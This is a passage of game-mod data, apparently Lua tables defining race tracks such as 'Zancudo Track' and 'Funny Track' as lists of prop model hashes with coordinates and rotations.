                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 368.107, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 359.929, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 351.75, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 343.571, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 335.392, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 327.213, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 319.035, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 310.856, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 302.677, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 294.498, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 286.319, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 278.141, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 269.962, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 261.783, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 253.604, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 245.425, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 237.247, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 229.068, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 220.889, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 212.71, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 204.531, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 196.353, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 188.174, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 179.995, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 171.816, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 163.637, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 155.459, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 147.28, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 139.101, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 130.922, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 122.743, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 114.565, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 106.386, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 98.207, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 90.0282, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 81.8494, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 73.6706, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 65.4918, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 57.313, 0.660085,
                            -0.919939, -109.32, -1, 6
                        }
                    }
                }, {
                    'Zancudo Track', c._vector3(-2273.76, 2985.19, 33.5), {
                        {
                            3213433054, -2661.22, 3209.43, 32.7118, 0, -0,
                            -120.437, -1, 8
                        },
                        {
                            3213433054, -2657.86, 3207.56, 32.7118, 0, 0,
                            59.6808, -1, 8
                        },
                        {
                            3213433054, -2659.52, 3212.33, 32.7118, 0, -0,
                            -120.437, -1, 8
                        },
                        {
                            3213433054, -2656.2, 3210.41, 32.7118, 0, 0,
                            59.6808, -1, 8
                        },
                        {
                            3213433054, -2654.54, 3213.26, 32.7118, 0, 0,
                            59.6808, -1, 8
                        },
                        {
                            3213433054, -2657.84, 3215.18, 32.7118, 0, -0,
                            -120.437, -1, 8
                        },
                        {
                            3213433054, -2615.14, 3183, 32.8118, 0, -0, -120.45,
                            -1, 8
                        },
                        {
                            3213433054, -2611.82, 3181.02, 32.8118, 0, 0,
                            58.529, -1, 8
                        },
                        {
                            3213433054, -2613.47, 3185.85, 32.8118, 0, -0,
                            -120.45, -1, 8
                        },
                        {
                            3213433054, -2610.11, 3183.91, 32.8118, 0, 0,
                            59.589, -1, 8
                        },
                        {
                            3213433054, -2611.79, 3188.7, 32.8118, 0, -0,
                            -120.45, -1, 8
                        },
                        {
                            3213433054, -2608.46, 3186.71, 32.8118, 0, 0,
                            58.529, -1, 8
                        },
                        {
                            3213433054, -2550.83, 3162.65, 32.7702, 0, -0,
                            -117.989, -1, 8
                        },
                        {
                            4109455646, -2547.01, 3160.66, 34.9496, 11.66,
                            -2.56132e-006, -118.95, -1, 8
                        },
                        {
                            3213433054, -2476.76, 3120.72, 32.7718, 0, -0,
                            -119.612, -1, 8
                        },
                        {
                            4109455646, -2473.51, 3118.83, 34.5672, 8.47412,
                            -0.0223369, -120.965, -1, 8
                        }, {
                            2975320548, -2442.43, 3105.7, 35.6224, -7.42001,
                            -5.12265e-006, 150.074, -1, 8
                        },
                        {
                            2975320548, -2443.67, 3101.83, 35.8732, -11.66,
                            3.84198e-006, 59.738, -1, 8
                        },
                        {
                            2975320548, -2438.8, 3099, 36.0155, -11.66,
                            -6.40331e-006, 59.7379, -1, 8
                        },
                        {
                            2975320548, -2434.05, 3096.22, 36.6871, -22.26,
                            -1.45141e-005, 59.7379, -1, 8
                        },
                        {
                            2975320548, -2446.85, 3098.2, 35.6088, -7.42,
                            3.20165e-006, -31.8463, -1, 8
                        },
                        {
                            2402097066, -2448.77, 3097.65, 35.4732, 0, -0,
                            -120.616, -1, 8
                        },
                        {
                            2402097066, -2442.95, 3108.08, 35.4832, 0, -0,
                            -117.436, -1, 8
                        },
                        {
                            2402097066, -2442.95, 3108.08, 35.4832, 0, -0,
                            -117.436, -1, 8
                        }, {
                            3681122061, -2389.55, 3069.11, 36.5952, 179.801,
                            -3.76861e-006, -117.806, -1, 8
                        },
                        {
                            1982829832, -2363.33, 3056.01, 31.8257, 0, -0,
                            -119.219, -1, 8
                        }, {
                            3681122061, -2389.55, 3069.11, 36.5952, 179.801,
                            -3.76861e-006, -117.806, -1, 8
                        },
                        {
                            2609922146, -2358.79, 3060.59, 31.8217, 0, -0,
                            -119.371, -1, 8
                        },
                        {
                            2975320548, -2325.93, 3034.99, 33.3214, 19.8,
                            3.41509e-006, -120.09, -1, 8
                        }, {
                            2975320548, -2321.78, 3032.58, 36.3899, 25.7399,
                            -8.62311e-005, -120.09, -1, 8
                        }, {
                            2975320548, -2317.79, 3030.29, 39.6222, 25.0799,
                            -6.23256e-005, -120.09, -1, 8
                        }, {
                            2975320548, -2313.74, 3027.94, 42.9228, 25.7399,
                            -8.62311e-005, -120.09, -1, 8
                        },
                        {
                            2975320548, -2309.83, 3025.69, 46.2289, 27.06,
                            -8.2816e-005, -120.09, -1, 8
                        },
                        {
                            2975320548, -2306.07, 3023.49, 49.5919, 29.0399,
                            -0.000116113, -120.09, -1, 8
                        },
                        {
                            2975320548, -2283.14, 3009.97, 44.7284, 14.12,
                            -2.04906e-005, 60.0397, -1, 8
                        },
                        {
                            2975320548, -2287.5, 3012.47, 46.9591, 13.6,
                            0.680011, 60.0397, -1, 8
                        },
                        {
                            2975320548, -2302.26, 3021.28, 53.174, 29.6999,
                            -0.000100745, -120.09, -1, 8
                        },
                        {
                            2975320548, -2292.06, 3015.11, 49.2546, 13.6,
                            1.53679e-005, 60.0397, -1, 8
                        },
                        {
                            2975320548, -2298.56, 3019.12, 56.7472, 30.36,
                            -8.79386e-005, -120.09, -1, 8
                        },
                        {
                            2052512905, -2294.52, 3015.08, 58.6366, 82.6616,
                            0.00430302, -31.2919, -1, 8
                        },
                        {
                            2052512905, -2293.13, 3017.4, 58.6822, 80.9428,
                            0.00560716, 149.187, -1, 8
                        },
                        {
                            2787492567, -2293.66, 3016.58, 31.8318, -90,
                            0.0833042, 109.919, -1, 8
                        },
                        {
                            3213433054, -2202.78, 2963.39, 32.8003, 0, -0,
                            -120.04, -1, 8
                        },
                        {
                            3213433054, -2199.53, 2961.53, 34.17, -40.5599,
                            -2.56132e-006, 59.8803, -1, 8
                        },
                        {
                            3681122061, -2137.1, 2904.97, 32.8327, 16.8,
                            -1.10991e-005, -141.061, -1, 8
                        },
                        {
                            3681122061, -2132.27, 2897.94, 34.4465, 16.8, -14,
                            -141.061, -1, 8
                        },
                        {
                            3681122061, -2127.12, 2890.88, 36.4432, 17.92,
                            -29.68, -136.581, -1, 8
                        },
                        {
                            3681122061, -2119.98, 2885.33, 38.8379, 17.92,
                            -29.68, -136.581, -1, 8
                        },
                        {
                            3681122061, -2113.02, 2880, 41.2705, 17.92, -29.68,
                            -136.581, -1, 8
                        },
                        {
                            3681122061, -2085.18, 2857.71, 49.9177, 19.04,
                            -43.12, -136.581, -1, 8
                        },
                        {
                            3681122061, -2078.1, 2852.44, 51.662, 19.0399,
                            -50.4001, -136.581, -1, 8
                        },
                        {
                            3681122061, -2092.05, 2863.54, 48.2285, 17.92,
                            -34.16, -136.581, -1, 8
                        },
                        {
                            3681122061, -2098.91, 2869.18, 46.2053, 17.92,
                            -29.68, -136.581, -1, 8
                        },
                        {
                            3681122061, -2105.97, 2874.59, 43.7379, 17.92,
                            -29.68, -136.581, -1, 8
                        },
                        {
                            3681122061, -2070.42, 2847.69, 53.5814, 19.0399,
                            -50.4001, -136.581, -1, 8
                        },
                        {
                            3681122061, -2062.85, 2843.01, 55.4739, 19.0399,
                            -50.4001, -136.581, -1, 8
                        },
                        {
                            3681122061, -2055.32, 2838.69, 56.5097, 17.7868,
                            -43.8868, -131.905, -1, 8
                        },
                        {
                            3681122061, -2047.61, 2834.88, 58.9097, 26.1867,
                            -43.8868, -131.905, -1, 8
                        },
                        {
                            3681122061, -2039.74, 2832.2, 62.2769, 38.5067,
                            -45.5668, -131.905, -1, 8
                        },
                        {
                            3681122061, -1996.98, 2830.2, 48.384, 0.202822,
                            -14.4337, -105.503, -1, 8
                        },
                        {
                            3681122061, -1996.42, 2832.89, 59.0601, -179.433,
                            12.3451, 76.9258, -1, 8
                        }, {
                            3213433054, -1951.86, 2849.63, 34.5146, -47.5199,
                            -7.59859e-005, 59.6261, -1, 8
                        }, {
                            3213433054, -1950.16, 2852.52, 34.5146, -47.5199,
                            -7.59859e-005, 59.6261, -1, 8
                        },
                        {
                            3213433054, -1953.57, 2854.49, 32.8004, 0, -0,
                            -120.091, -1, 8
                        },
                        {
                            3213433054, -1955.25, 2851.59, 32.8004, 0, -0,
                            -120.091, -1, 8
                        },
                        {
                            4111834409, -1960.72, 2857.38, 31.7305, 0, -0,
                            -118.505, -1, 8
                        },
                        {
                            4109455646, -2144, 2967.21, 36.0606, 9.35852,
                            -0.00134085, 59.8371, -1, 8
                        },
                        {
                            4109455646, -2139.63, 2964.67, 33.9985, 5.84852,
                            -0.0013321, 59.8371, -1, 8
                        },
                        {
                            4109455646, -2135.45, 2962.3, 32.4604, 0, 0,
                            60.4792, -1, 8
                        },
                        {
                            2975320548, -2193.23, 2995.21, 35.0684, 11.6996,
                            -0.00262322, -119.238, -1, 8
                        }, {
                            2975320548, -2197.74, 2997.74, 32.8074, 15.2099,
                            2.04906e-005, -119.328, -1, 8
                        },
                        {
                            3213433054, -2246.82, 3026.19, 33.0318, 0.0331696,
                            0.0056356, 58.6423, -1, 8
                        },
                        {
                            3213433054, -2256.38, 3032.02, 35.4343, 6.5707,
                            0.0279573, 58.7685, -1, 8
                        },
                        {
                            3213433054, -2265.19, 3037.37, 38.408, 10.1262,
                            0.0254109, 58.7585, -1, 8
                        },
                        {
                            3213433054, -2273.45, 3042.38, 40.214, 8.95404,
                            -0.00182451, 58.7729, -1, 8
                        },
                        {
                            3213433054, -2281.36, 3047.19, 42.7382, 8.89319,
                            0.151422, 58.8279, -1, 8
                        },
                        {
                            3213433054, -2289.41, 3052.05, 46.2871, 13.2,
                            0.000150264, 58.7642, -1, 8
                        },
                        {
                            3213433054, -2397.86, 3114.2, 32.8449, 0, 0,
                            60.2049, -1, 8
                        },
                        {
                            3213433054, -2402.38, 3116.77, 34.7648, 0, 0,
                            60.2049, -1, 8
                        },
                        {
                            2475986526, -2394.65, 3118.07, 32.5452, 0, 0,
                            56.6241, -1, 8
                        },
                        {
                            2475986526, -2397.73, 3120.09, 34.1452, 2.04,
                            -1.38738e-006, 56.6241, -1, 8
                        },
                        {
                            2475986526, -2401.78, 3122.77, 36.6227, 8.16,
                            1.28066e-006, 56.6239, -1, 8
                        },
                        {
                            2475986526, -2405.48, 3125.2, 39.5571, 14.28,
                            1.02453e-005, 56.6239, -1, 8
                        },
                        {
                            2475986526, -2409.12, 3127.6, 43.2064, 20.4,
                            -2.39057e-005, 56.6239, -1, 8
                        },
                        {
                            2475986526, -2412.29, 3129.71, 46.9494, 24.4781,
                            -1.43125, 56.2632, -1, 8
                        },
                        {
                            2475986526, -2415.18, 3131.49, 51.529, 38.3931,
                            -3.70399, 55.299, -1, 8
                        },
                        {
                            2475986526, -2416.96, 3132.28, 56.2986, 54.0331,
                            -3.70398, 53.2589, -1, 8
                        },
                        {
                            2475986526, -2417.37, 3132.16, 61.6124, 73.753,
                            -3.70394, 53.2588, -1, 8
                        },
                        {
                            2475986526, -2416.48, 3131.04, 66.996, 90.9129,
                            -3.70395, 53.2587, -1, 8
                        },
                        {
                            2475986526, -2414.88, 3129.5, 70.998, 104.113,
                            -3.70383, 50.6186, -1, 8
                        },
                        {
                            2475986526, -2412.46, 3127.2, 74.61, 116.653,
                            -3.70392, 50.6185, -1, 8
                        },
                        {
                            2475986526, -2409.58, 3124.71, 77.6119, 121.273,
                            -3.70395, 50.6185, -1, 8
                        },
                        {
                            2475986526, -2406.75, 3122.18, 80.0586, 127.213,
                            -3.70391, 50.6184, -1, 8
                        },
                        {
                            2475986526, -2403.38, 3119.23, 82.2502, 135.793,
                            -3.70396, 50.6185, -1, 8
                        },
                        {
                            2475986526, -2369.71, 3092.81, 68.2807, -146.327,
                            -3.7039, 50.6183, -1, 8
                        },
                        {
                            2475986526, -2367.45, 3091.4, 63.3347, -134.447,
                            -3.70392, 50.6182, -1, 8
                        },
                        {
                            2475986526, -2366, 3090.66, 58.0814, -123.887,
                            -3.7039, 50.6182, -1, 8
                        },
                        {
                            2475986526, -2365.38, 3090.57, 53.1623, -112.007,
                            -3.70391, 50.6182, -1, 8
                        },
                        {
                            2475986526, -2365.62, 3091.18, 48.0172, -99.4666,
                            -3.70393, 50.6181, -1, 8
                        },
                        {
                            2475986526, -2366.77, 3092.54, 43.04, -86.2661,
                            -3.70399, 50.6181, -1, 8
                        },
                        {
                            2475986526, -2368.73, 3094.52, 38.5669, -74.386,
                            -3.70392, 50.6181, -1, 8
                        },
                        {
                            2475986526, -2371.25, 3096.8, 35.0692, -59.206,
                            -3.70384, 55.2379, -1, 8
                        },
                        {
                            2475986526, -2375.18, 3099.61, 32.3997, -42.0459,
                            -3.70387, 57.2179, -1, 8
                        },
                        {
                            2475986526, -2395.69, 3112.77, 84.6355, 152.292,
                            -3.70389, 50.6184, -1, 8
                        },
                        {
                            2475986526, -2391.54, 3109.37, 84.6603, 162.192,
                            -3.70393, 50.6184, -1, 8
                        },
                        {
                            2475986526, -2387.13, 3105.84, 83.6595, 172.752,
                            -3.70391, 50.6184, -1, 8
                        },
                        {
                            2475986526, -2382.97, 3102.56, 81.8101, -179.988,
                            -3.70391, 50.6184, -1, 8
                        },
                        {
                            2475986526, -2372.52, 3094.76, 72.6855, -154.907,
                            -3.70391, 50.6183, -1, 8
                        },
                        {
                            2475986526, -2379.11, 3099.59, 79.371, -172.728,
                            -3.70391, 50.6183, -1, 8
                        },
                        {
                            2475986526, -2375.46, 3096.85, 76.1692, -162.168,
                            -3.70388, 50.6182, -1, 8
                        },
                        {
                            2475986526, -2399.8, 3116.19, 83.7512, 143.712,
                            -3.70387, 50.6184, -1, 8
                        },
                        {
                            3213433054, -2510.73, 3180.4, 32.8111, 0, 0,
                            59.4291, -1, 8
                        },
                        {
                            209943352, -2302.92, 3059.95, 50.2208, 76.8397,
                            -0.679965, -120.716, -1, 8
                        },
                        {
                            209943352, -2298.84, 3057.5, 48.7042, 71.3997,
                            -0.679954, -120.716, -1, 8
                        },
                        {
                            209943352, -2290.6, 3052.58, 47.3498, 84.3198,
                            -0.679946, -120.716, -1, 8
                        },
                        {
                            209943352, -2290.6, 3052.58, 47.3498, 84.3198,
                            -0.679946, -120.716, -1, 8
                        },
                        {
                            209943352, -2294.73, 3055.05, 47.6692, 76.8398,
                            -0.680059, -120.716, -1, 8
                        },
                        {
                            209943352, -2533.2, 3193.91, 37.3948, 0, -0,
                            -120.716, -1, 8
                        },
                        {
                            209943352, -2533.2, 3193.91, 37.3948, 0, -0,
                            -120.716, -1, 8
                        },
                        {
                            209943352, -2425.58, 3091.36, 36.493, 0, -0,
                            -120.716, -1, 8
                        },
                        {
                            209943352, -2425.58, 3091.36, 36.493, 0, -0,
                            -120.716, -1, 8
                        },
                        {
                            209943352, -2293.7, 3012.65, 55.3685, -89.7587,
                            -0.659716, -30.2946, -1, 8
                        },
                        {
                            209943352, -2293.7, 3012.65, 55.3685, -89.7587,
                            -0.659716, -30.2946, -1, 8
                        }
                    }
                }, {
                    'Funny Track', c._vector3(-1066.77, -3152.48, 14.5), {
                        {
                            3681122061, -1018.78, -2937.26, 12.9646, 0, 0,
                            -30.3132, -1, 9
                        },
                        {
                            3681122061, -1023.38, -2945.17, 12.9646, 0, 0,
                            -30.3132, -1, 9
                        },
                        {
                            3681122061, -1028.02, -2953.13, 12.9646, 0, 0,
                            -30.3132, -1, 9
                        },
                        {
                            3681122061, -1032.66, -2961.06, 12.9646, 0, 0,
                            -30.3132, -1, 9
                        },
                        {
                            3681122061, -1037.32, -2969.04, 12.9646, 0, 0,
                            -30.3132, -1, 9
                        },
                        {
                            3681122061, -1041.95, -2976.96, 12.9646, 0, 0,
                            -30.3132, -1, 9
                        },
                        {
                            3681122061, -1046.18, -2984.19, 12.9646, 0, 0,
                            -30.3132, -1, 9
                        },
                        {
                            3681122061, -1050.78, -2992.12, 12.9646, 0, 0,
                            -29.8732, -1, 9
                        },
                        {
                            3681122061, -1053.22, -2998.13, 12.9646, 0, 0,
                            -14.2534, -1, 9
                        },
                        {
                            3681122061, -1054.14, -3005.28, 12.9646, 0, 0,
                            -0.613478, -1, 9
                        },
                        {
                            3681122061, -1053.45, -3012.85, 12.9646, 0, 0,
                            11.4866, -1, 9
                        },
                        {
                            3681122061, -1051.19, -3020.08, 12.9646, 0, 0,
                            23.3667, -1, 9
                        },
                        {
                            3681122061, -1047.43, -3026.73, 12.9646, 0, 0,
                            35.2469, -1, 9
                        },
                        {
                            3681122061, -1042.42, -3032.37, 12.9646, 0, 0,
                            47.7871, -1, 9
                        },
                        {
                            3681122061, -1037.1, -3038.16, 12.9646, 0, 0,
                            37.2273, -1, 9
                        },
                        {
                            3681122061, -1033.11, -3044.75, 12.9646, 0, 0,
                            25.5675, -1, 9
                        },
                        {
                            3681122061, -1030.43, -3052.11, 12.9646, 0, 0,
                            14.5676, -1, 9
                        },
                        {
                            3681122061, -1029.18, -3059.85, 12.9646, 0, 0,
                            4.00757, -1, 9
                        },
                        {
                            3681122061, -1029.37, -3067.7, 12.9646, 0, 0,
                            -6.55247, -1, 9
                        },
                        {
                            3681122061, -1031, -3075.33, 12.9646, 0, 0,
                            -17.5525, -1, 9
                        },
                        {
                            3681122061, -1034.09, -3082.35, 12.9646, 0, 0,
                            -29.6525, -1, 9
                        },
                        {
                            3681122061, -1038.6, -3088.77, 12.9646, 0, 0,
                            -40.2127, -1, 9
                        },
                        {
                            3681122061, -1044.19, -3094.15, 12.9646, 0, 0,
                            -51.653, -1, 9
                        },
                        {
                            3681122061, -1050.65, -3098.2, 12.9646, 0, 0,
                            -63.7531, -1, 9
                        },
                        {
                            3681122061, -1057.89, -3100.91, 12.9646, 0, 0,
                            -75.1935, -1, 9
                        },
                        {
                            3681122061, -1065.18, -3101.87, 12.9646, 0, 0,
                            -89.7139, -1, 9
                        },
                        {
                            3681122061, -1073.03, -3101.2, 12.9646, 0, -0,
                            -100.054, -1, 9
                        },
                        {
                            3681122061, -1080.63, -3099.11, 12.9646, 0, -0,
                            -110.615, -1, 9
                        },
                        {
                            3681122061, -1087.92, -3095.65, 12.9646, 0, -0,
                            -119.855, -1, 9
                        },
                        {
                            3681122061, -1095.95, -3091.03, 12.9646, 0, -0,
                            -119.855, -1, 9
                        },
                        {
                            3681122061, -1104.01, -3086.4, 12.9646, 0, -0,
                            -119.855, -1, 9
                        },
                        {
                            3681122061, -1112.04, -3081.79, 12.9646, 0, -0,
                            -119.855, -1, 9
                        },
                        {
                            3681122061, -1120.04, -3077.19, 12.9646, 0, -0,
                            -119.855, -1, 9
                        },
                        {
                            3681122061, -1128.1, -3072.56, 12.9646, 0, -0,
                            -119.855, -1, 9
                        },
                        {
                            3681122061, -1136.15, -3067.93, 12.9646, 0, -0,
                            -119.855, -1, 9
                        },
                        {
                            3681122061, -1144.2, -3063.31, 12.9646, 0, -0,
                            -119.855, -1, 9
                        },
                        {
                            3681122061, -1152.22, -3058.7, 12.9646, 0, -0,
                            -119.855, -1, 9
                        },
                        {
                            3681122061, -1160.24, -3054.09, 12.9646, 0, -0,
                            -119.855, -1, 9
                        },
                        {
                            3681122061, -1168.22, -3049.48, 12.9646, 0, -0,
                            -120.295, -1, 9
                        },
                        {
                            3681122061, -1176.21, -3044.8, 12.9646, 0, -0,
                            -120.295, -1, 9
                        },
                        {
                            3681122061, -1183.28, -3040.14, 12.9646, 0, -0,
                            -126.455, -1, 9
                        },
                        {
                            3681122061, -1189.23, -3034.89, 12.9646, 0, -0,
                            -136.356, -1, 9
                        },
                        {
                            3681122061, -1193.86, -3028.84, 12.9646, 0, -0,
                            -148.677, -1, 9
                        },
                        {
                            3681122061, -1197.2, -3021.86, 12.9646, 0, -0,
                            -159.898, -1, 9
                        },
                        {
                            3681122061, -1198.78, -3014.77, 12.9646, 0, -0,
                            -174.639, -1, 9
                        },
                        {
                            3681122061, -1198.72, -3007.04, 12.9646, 0, -0,
                            173.701, -1, 9
                        },
                        {
                            3681122061, -1197, -2999.97, 12.9646, 0, -0,
                            158.962, -1, 9
                        },
                        {
                            3681122061, -1193.5, -2993.3, 12.9646, 0, -0,
                            145.982, -1, 9
                        },
                        {
                            3681122061, -1188.51, -2987.1, 12.9646, 0, -0,
                            136.083, -1, 9
                        },
                        {
                            3681122061, -1182.5, -2981.85, 12.9646, 0, -0,
                            126.183, -1, 9
                        },
                        {
                            3681122061, -1175.98, -2978.23, 12.9646, 0, -0,
                            112.104, -1, 9
                        },
                        {
                            3681122061, -1168.67, -2976.15, 12.9646, 0, -0,
                            99.7843, -1, 9
                        },
                        {
                            3681122061, -1160.82, -2975.53, 12.9646, 0, 0,
                            89.4449, -1, 9
                        },
                        {
                            3681122061, -1152.93, -2976.29, 12.9646, 0, 0,
                            79.5455, -1, 9
                        },
                        {
                            3681122061, -1145.21, -2978.39, 12.9646, 0, 0,
                            70.0859, -1, 9
                        },
                        {
                            3681122061, -1138.14, -2981.75, 12.9646, 0, 0,
                            59.0863, -1, 9
                        },
                        {
                            3681122061, -1130.27, -2986.43, 12.9646, 0, 0,
                            59.0863, -1, 9
                        },
                        {
                            3681122061, -1122.46, -2991.09, 12.9646, 0, 0,
                            59.0863, -1, 9
                        },
                        {
                            3681122061, -1115.12, -2994.75, 12.9646, 0, 0,
                            67.1435, -1, 9
                        },
                        {
                            3681122061, -1107.63, -2997.13, 12.9646, 0, 0,
                            76.9913, -1, 9
                        },
                        {
                            3681122061, -1099.8, -2998.14, 12.9646, 0, 0,
                            86.8389, -1, 9
                        },
                        {
                            3681122061, -1091.94, -2997.76, 12.9646, 0, -0,
                            97.5819, -1, 9
                        },
                        {
                            3681122061, -1084.47, -2995.95, 12.9646, 0, -0,
                            108.325, -1, 9
                        },
                        {
                            3681122061, -1077.64, -2992.78, 12.9646, 0, -0,
                            119.963, -1, 9
                        },
                        {
                            3681122061, -1077.64, -2992.78, 12.9646, 0, -0,
                            119.963, -1, 9
                        },
                        {
                            3681122061, -1071.68, -2988.3, 12.9646, 0, -0,
                            132.496, -1, 9
                        },
                        {
                            3681122061, -1066.33, -2982.53, 12.9646, 0, -0,
                            141.449, -1, 9
                        },
                        {
                            3681122061, -1053.01, -2960.01, 12.9646, 0, 0,
                            -28.5532, -1, 9
                        },
                        {
                            3681122061, -1048.58, -2951.88, 12.9646, 0, 0,
                            -28.5532, -1, 9
                        },
                        {
                            3681122061, -1044.16, -2943.76, 12.9646, 0, 0,
                            -28.5532, -1, 9
                        },
                        {
                            3681122061, -1039.74, -2935.64, 12.9646, 0, 0,
                            -28.5532, -1, 9
                        },
                        {
                            3681122061, -1035.5, -2927.86, 12.9646, 0, 0,
                            -28.5532, -1, 9
                        },
                        {
                            3608473212, -1063.23, -2993.67, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1067.37, -2998.06, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1063.7, -2994.67, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1064.21, -2995.73, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1064.71, -2996.8, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1065.21, -2997.84, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1067.1, -2999.45, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1065.43, -3000.24, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1068.29, -3000.06, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1065.92, -3001.18, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1066.44, -3002.28, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1065.35, -3002.77, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1065.6, -3003.96, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1066.11, -3005.04, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1064.21, -2999.56, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1069.53, -3000.82, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1070.75, -3001.52, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1068.76, -3002.46, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1069.29, -3003.54, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1068.44, -3005.23, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1071.58, -3003.74, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            2475986526, -1072.98, -3006.81, 16.0846, 0, 0,
                            -26.0348, -1, 9
                        },
                        {
                            3608473212, -1072.44, -3002.05, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            3608473212, -1073.73, -3002.72, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            2475986526, -1076.54, -3005.07, 16.0846, 0, 0,
                            -26.0348, -1, 9
                        },
                        {
                            2475986526, -1078.92, -3009.92, 13.7046, 0, 0,
                            -26.0348, -1, 9
                        },
                        {
                            2475986526, -1075.31, -3011.69, 13.7046, 0, 0,
                            -26.0348, -1, 9
                        },
                        {
                            2475986526, -1069.34, -3008.59, 16.0846, 0, 0,
                            -26.0348, -1, 9
                        },
                        {
                            2475986526, -1071.71, -3013.45, 13.7046, 0, 0,
                            -26.0348, -1, 9
                        },
                        {
                            2475986526, -1068.14, -3015.2, 13.7046, 0, 0,
                            -26.0348, -1, 9
                        },
                        {
                            3608473212, -1065.36, -3006.66, 15.3449, 0, 0,
                            -25.1145, -1, 9
                        },
                        {
                            2475986526, -1065.75, -3010.35, 16.0846, 0, 0,
                            -26.0348, -1, 9
                        }
                    }
                }, {
